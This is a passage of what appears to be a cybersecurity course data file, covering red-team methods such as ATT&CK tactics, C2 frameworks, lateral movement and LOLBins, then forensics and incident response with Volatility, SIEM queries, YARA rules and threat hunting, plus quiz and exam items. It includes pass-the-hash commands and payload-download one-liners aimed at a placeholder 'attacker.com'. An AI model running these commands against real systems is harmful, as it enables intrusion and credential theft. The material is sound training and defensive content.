  Scope: Entire organisation — people, physical, technology
  Goal: Test detection and response capability (can we get to target X undetected?)
  Rules: Simulate real threat actor — use whatever works
  Duration: 3-6 months
  Output: Attack narrative, detection gaps, process improvements

Bug Bounty:
  Scope: Defined by programme (public or invite-only)
  Goal: Find specific vulnerabilities for financial reward
  Rules: Strict rules of engagement — out of scope = ban
  Duration: Ongoing
  Output: Vulnerability report to vendor
\`\`\`

## MITRE ATT&CK Framework

ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a knowledge base of real adversary behaviour. Every technique has an ID (T1234) and maps to a tactic.

\`\`\`
Tactics (phases):
TA0043 Reconnaissance    → T1595 Active Scanning, T1598 Phishing for Info
TA0042 Resource Dev      → T1587 Develop Capabilities
TA0001 Initial Access    → T1566 Phishing, T1190 Exploit Public-Facing App
TA0002 Execution         → T1059 Command & Scripting Interpreter
TA0003 Persistence       → T1053 Scheduled Task, T1547 Boot Autostart
TA0004 Privilege Esc     → T1068 Exploitation for PrivEsc, T1548 Abuse Elevation
TA0005 Defence Evasion   → T1070 Indicator Removal, T1027 Obfuscation
TA0006 Credential Access → T1003 OS Credential Dumping, T1110 Brute Force
TA0007 Discovery         → T1087 Account Discovery, T1082 System Info
TA0008 Lateral Movement  → T1021 Remote Services, T1550 Use Alt Auth Material
TA0009 Collection        → T1005 Data from Local System
TA0010 Exfiltration      → T1041 Exfil over C2 Channel
TA0040 Impact            → T1486 Data Encrypted (Ransomware)
\`\`\`

## C2 Frameworks

Command & Control infrastructure allows attackers to manage compromised machines.

\`\`\`
Architecture:
Attacker → [C2 Server] ← → [Beacon/Agent on victim]

Popular frameworks:
Cobalt Strike  — commercial, most widely used by threat actors
Sliver         — open source, Golang, multi-platform
Havoc          — open source, C++
Metasploit     — msfconsole + meterpreter (most common in basic pentests)

Beacon communications:
- HTTPS to look like normal web traffic
- DNS tunnelling — exfiltrate via DNS queries
- Slack/Teams/Twitter API — blend with business comms
\`\`\`

## Lateral Movement Techniques

\`\`\`bash
# Pass-the-Hash via SMB
crackmapexec smb 192.168.1.0/24 -u administrator -H <ntlm_hash>
# Find where hash is valid → access those machines

# WinRM (PowerShell remoting)
evil-winrm -i 192.168.1.10 -u administrator -H <ntlm_hash>

# PsExec via Impacket
impacket-psexec administrator@192.168.1.10 -hashes :<ntlm_hash>

# RDP with stolen credentials
xfreerdp /u:administrator /pth:<ntlm_hash> /v:192.168.1.10

# WMI execution
impacket-wmiexec administrator@192.168.1.10 -hashes :<ntlm_hash>
\`\`\`

## Living Off the Land (LOLBins)

Use legitimate Windows binaries to avoid detection. EDR solutions flag common attacker tools — using built-in binaries is harder to detect.

\`\`\`powershell
# Download file without powershell.exe
certutil.exe -urlcache -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
mshta.exe http://attacker.com/payload.hta

# Execute without creating a process visible in Task Manager
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -EncodedCommand <base64_payload>

# LOLBins reference: lolbas-project.github.io
\`\`\`

## Professional Penetration Test Report

A report that gets findings fixed is structured clearly for both executives and developers.

\`\`\`
Report Structure:
1. Cover Page — client, date, engagement type, classification
2. Executive Summary (1-2 pages) — NON-TECHNICAL
   - Overall risk rating
   - Key findings in plain English
   - Business impact
   - Top 3 recommendations

3. Scope and Methodology
   - What was tested
   - Dates, tools used
   - Testing limitations

4. Findings Summary Table
   | # | Finding | Severity | CVSS | Status |
   | 1 | SQLi in /login | Critical | 9.8 | Open |
   | 2 | IDOR in /api/user | High | 8.1 | Open |

5. Detailed Findings (one per page):
   ┌─────────────────────────────────────┐
   │ Finding: SQL Injection in Login     │
   │ Severity: CRITICAL (CVSS 9.8)      │
   │ Affected: https://app.company.com/login │
   │                                     │
   │ Description:                        │
   │ The username parameter is not...    │
   │                                     │
   │ Evidence:                           │
   │ [Screenshot of sqlmap output]       │
   │ [Request/Response]                  │
   │                                     │
   │ Business Impact:                    │
   │ An unauthenticated attacker can...  │
   │                                     │
   │ Remediation:                        │
   │ Use parameterised queries:          │
   │ $stmt = $pdo->prepare(             │
   │   "SELECT * FROM users WHERE id=?");│
   │ $stmt->execute([$id]);             │
   └─────────────────────────────────────┘

6. Remediation Roadmap
   - Critical: Fix within 24-48 hours
   - High: Fix within 1 week
   - Medium: Fix within 1 month
   - Low: Fix in next sprint/cycle

7. Appendices
   - Full tool output
   - CVE references
   - Methodology references (OWASP, PTES)
\`\`\``,
          interviewQuestions: [
            { question: "What is 'living off the land' and why do advanced attackers use it?", answer: "Living off the land (LOLBins) means using legitimate, pre-installed system tools (certutil, mshta, regsvr32, PowerShell, WMI) instead of custom malware. This evades signature-based antivirus and reduces EDR alerts because these are known-good binaries. Security teams expect these processes to run, making malicious usage harder to distinguish from legitimate activity.", difficulty: "mid" },
            { question: "Why is an executive summary the most important part of a penetration test report?", answer: "Executives make budget decisions and drive remediation priority. A technical-only report may not get acted on. The executive summary translates findings into business risk — 'an attacker could access all customer data' is more actionable than 'UNION-based SQL injection in parameter id'. Decision-makers who understand impact allocate resources to fix issues.", difficulty: "junior" }
          ],
          quizQuestions: [
            { question: "You are writing a pentest report. You found SQLi (CVSS 9.8), an exposed .env file with DB credentials (CVSS 7.5), and an admin panel with default credentials (CVSS 8.8). How do you prioritise and what business impact do you describe for the SQLi?", answer: "Priority: 1) SQLi Critical (CVSS 9.8) 2) Default creds High (CVSS 8.8) 3) .env exposure High (CVSS 7.5). SQLi business impact: 'An unauthenticated attacker can extract the complete user database including email addresses, hashed passwords, and payment information, constituting a GDPR reportable data breach with potential regulatory fines up to 4% of annual turnover. Full database compromise also allows insertion/deletion of records.'", type: "scenario", difficulty: "mid" }
          ]
        }
      ],
      exam: [
        { question: "What does NX/DEP protect against and what technique bypasses it?", answer: "NX (No-Execute) / DEP (Data Execution Prevention) marks stack and heap memory as non-executable, preventing shellcode injection. It is bypassed with ret2libc (return to existing libc function) or ROP chains (chaining existing executable code gadgets ending in 'ret') — both reuse existing executable code rather than executing injected code.", difficulty: "senior" },
        { question: "Describe the MITRE ATT&CK tactic sequence for a typical ransomware attack.", answer: "Initial Access (T1566 phishing) → Execution (T1059 PowerShell) → Persistence (T1053 scheduled task) → Privilege Escalation (T1068 local exploit) → Defence Evasion (T1070 log clearing, T1027 obfuscation) → Credential Access (T1003 credential dumping) → Lateral Movement (T1021 SMB) → Collection (T1005 local files) → Impact (T1486 data encryption).", difficulty: "mid" }
      ]
    },

    // ─── MODULE 11: FORENSICS & INCIDENT RESPONSE ─────────────────────────────
    {
      id: "dfir",
      title: "Digital Forensics & Incident Response",
      level: "advanced",
      description: "The defender's playbook. Incident response lifecycle, disk and memory forensics, log analysis with SIEM, threat hunting, and malware analysis fundamentals.",
      lessons: [
        {
          id: "incident-response",
          title: "Incident Response & Digital Forensics",
          duration: 70,
          type: "lesson",
          description: "The PICERL lifecycle, forensic acquisition, memory analysis with Volatility, log analysis, SIEM, threat hunting, and writing the forensic report.",
          objectives: [
            "Apply the PICERL incident response lifecycle to a real incident",
            "Acquire forensic images while preserving chain of custody",
            "Perform memory forensics with Volatility to find malware",
            "Hunt for threats using SIEM queries and YARA rules",
            "Write a professional incident report"
          ],
          content: `# Incident Response & Digital Forensics

## The PICERL Incident Response Lifecycle

\`\`\`
P — Preparation
    IR plan documented, team trained, tools ready
    Logging enabled on all systems, SIEM deployed
    Communication templates prepared (legal, PR, regulators)

I — Identification
    Detect the incident (alert, user report, threat intel)
    Initial triage: what is affected? How severe?
    Declare incident, assign severity (P1-P4)

C — Containment
    Short-term: isolate affected systems (network isolation)
    Long-term: patch, rebuild, harden before reconnecting
    Preserve evidence before containment changes the system!

E — Eradication
    Remove attacker's access: delete malware, close backdoors
    Reset ALL compromised credentials
    Rebuild affected systems from clean images

R — Recovery
    Restore services from clean backups
    Monitor closely for re-compromise
    Gradual return to production

L — Lessons Learned
    Post-incident review (within 2 weeks)
    Root cause analysis
    Update IR plan, detection rules, security controls
\`\`\`

## Forensic Evidence Acquisition

**Chain of custody** — documented, unbroken record of evidence handling. Required for legal proceedings.

\`\`\`bash
# Forensic disk image (bit-for-bit copy, preserves deleted files)
# dd (basic, no verification)
dd if=/dev/sda of=/forensics/case001/disk.img bs=4M status=progress

# dcfldd (enhanced dd with hashing)
dcfldd if=/dev/sda of=/forensics/case001/disk.img hash=sha256 hashlog=disk.img.sha256

# Best: ewfacquire (Expert Witness Format — industry standard)
ewfacquire /dev/sda -t /forensics/case001/disk
# Creates .E01 files with embedded checksums, case metadata, compression

# ALWAYS hash the original and copy:
sha256sum /dev/sda        # hash of original (must be done before imaging)
sha256sum disk.img        # hash of image (must match original)
# Document: date, examiner, hash values, chain of custody form

# Memory acquisition (must be done FIRST — most volatile)
sudo avml /forensics/memory.lime
sudo fmem -o /forensics/memory.raw
\`\`\`

## Memory Forensics with Volatility

Memory contains running processes, network connections, encryption keys, and malware that never touches disk.

\`\`\`bash
# Identify OS profile
volatility -f memory.raw imageinfo

# List running processes
vol.py -f memory.raw --profile=Win10x64 pslist
vol.py -f memory.raw --profile=Win10x64 pstree    # parent-child relationships
vol.py -f memory.raw --profile=Win10x64 psscan     # includes hidden/terminated processes

# Find malicious processes:
# Unusual parent: cmd.exe spawned by Word.exe (malicious macro)
# Misspelled: svch0st.exe, lsaas.exe (typosquatting)
# Running from temp: C:\\Users\\user\\AppData\\Local\\Temp\\malware.exe

# Network connections
vol.py -f memory.raw --profile=Win10x64 netscan
# Look for: unusual outbound connections, connections to known malicious IPs

# Find injected code (process hollowing, DLL injection)
vol.py -f memory.raw --profile=Win10x64 malfind
# Shows memory regions: Executable + Not backed by a file = likely shellcode/injection

# Dump suspicious process for further analysis
vol.py -f memory.raw --profile=Win10x64 procdump -p 1234 --dump-dir ./dumps/

# Extract command history
vol.py -f memory.raw --profile=Win10x64 cmdscan
vol.py -f memory.raw --profile=Win10x64 consoles

# Registry hives in memory — find persistence
vol.py -f memory.raw --profile=Win10x64 hivelist
vol.py -f memory.raw --profile=Win10x64 printkey -K "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

## Log Analysis & SIEM

\`\`\`bash
# Windows Event IDs to know:
# 4624 — Successful logon
# 4625 — Failed logon
# 4648 — Logon with explicit credentials (Pass-the-Hash indicator)
# 4768 — Kerberos TGT request
# 4769 — Kerberos service ticket request (Kerberoasting: multiple 4769 in short time)
# 4771 — Kerberos pre-auth failed
# 7045 — New service installed (malware persistence)
# 4698 — Scheduled task created (persistence)

# PowerShell logging (Security Operations gold):
# 4103 — Module logging (what modules were loaded)
# 4104 — Script block logging (actual PS code that ran)

# Linux auth.log queries:
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
# Top IPs brute-forcing SSH

# Splunk SPL queries:
index=windows EventCode=4625 | stats count by src_ip | sort -count
index=windows EventCode=4769 | stats count by Service_Name | where count>50
\`\`\`

## YARA Rules — Pattern Matching for Malware

\`\`\`
rule Ransomware_Extension_Change {
    meta:
        description = "Detects ransomware file extension modification"
        author = "SOC Team"
        severity = "critical"

    strings:
        $ext1 = ".locked" nocase
        $ext2 = ".encrypted" nocase
        $ext3 = ".crypt" nocase
        $ransom_note = "YOUR FILES HAVE BEEN ENCRYPTED" nocase

    condition:
        any of ($ext*) and $ransom_note
}

rule Mimikatz_Strings {
    strings:
        $s1 = "sekurlsa::logonpasswords" wide ascii
        $s2 = "lsadump::sam" wide ascii
        $s3 = "kerberos::golden" wide ascii

    condition:
        2 of ($s*)
}
\`\`\`

\`\`\`bash
# Scan a file/directory
yara ransomware.yar /path/to/suspicious/
yara -r mimikatz.yar /

# Scan memory dump
yara ransomware.yar memory.raw
\`\`\`

## Threat Hunting

Threat hunting is proactive — you assume a breach has already occurred and look for evidence.

\`\`\`
Hypothesis-based hunting:
"Assume an attacker has established persistence via scheduled tasks"

Hunt:
1. Pull all scheduled task creation events (EventID 7045, 4698) from last 90 days
2. Baseline: what are the normal scheduled tasks on these systems?
3. Anomaly: new task, unusual author, unusual binary path, unusual time

\`\`\`bash
# Hunt for LOLBin usage
index=windows process_name IN ("certutil.exe", "mshta.exe", "regsvr32.exe")
| where CommandLine LIKE "%urlcache%" OR CommandLine LIKE "%http%"

# Hunt for process injection indicators
index=windows EventCode=10    # Process access events (Sysmon)
| where TargetImage LIKE "%lsass.exe%"
# lsass.exe being accessed by unusual processes = credential dumping

# Hunt for base64 encoded PowerShell
index=windows EventCode=4104
| where ScriptBlockText LIKE "%-EncodedCommand%"
OR ScriptBlockText LIKE "%-enc %"
\`\`\``,
          interviewQuestions: [
            { question: "What is the order of volatility in digital forensics and why does it matter?", answer: "Order of volatility is the sequence in which evidence should be collected, from most ephemeral to most persistent: 1) CPU registers/cache, 2) memory (RAM), 3) network state (connections), 4) running processes, 5) disk (files, logs), 6) remote logging, 7) physical media. Evidence must be collected in this order because more volatile data disappears first — memory is lost on power-off, network connections change continuously.", difficulty: "mid" },
            { question: "What Windows Event ID indicates Kerberoasting and what does the pattern look like?", answer: "Event ID 4769 (Kerberos Service Ticket request). Normal users request a handful of service tickets per day. Kerberoasting generates dozens or hundreds of 4769 events in a short period as the attacker requests tickets for all SPNs in the domain. Also look for Ticket Encryption Type 0x17 (RC4-HMAC) — attackers request RC4 tickets because they are faster to crack than AES tickets.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "Volatility's malfind plugin reports a memory region in process 'explorer.exe' as RWX (readable, writable, executable) with no backing file on disk. What does this indicate and what would you do next?", answer: "RWX memory with no backing file is a strong indicator of injected shellcode or process hollowing — malware has written executable code directly into explorer.exe's memory without a corresponding file. Next steps: 1) Dump the memory region (vaddump). 2) Analyse statically in Ghidra or Cutter. 3) Check network connections for that process (netscan). 4) Extract strings from the dump for IOCs. 5) Run through VirusTotal or sandbox.", type: "scenario", difficulty: "senior" }
          ]
        }
      ],
      exam: [
        { question: "What is the first action when a system is suspected of compromise and why?", answer: "Preserve volatile evidence FIRST — take a memory dump before doing anything else. Then consider containment (network isolation). Shutting the system down or even just running tools changes the disk and clears memory. The order: 1) Memory dump 2) Network isolation 3) Disk image.", difficulty: "mid" },
        { question: "Describe three persistence mechanisms on Windows that threat hunters should routinely check.", answer: "1) Registry Run keys (HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) — programs that auto-start on login. 2) Scheduled Tasks (schtasks /query) — tasks that run on schedule or trigger. 3) Services (sc query) — malware installed as a service survives reboots. Bonus: Startup folders, DLL search order hijacking, WMI event subscriptions.", difficulty: "mid" }
      ]
    }
  ]
};
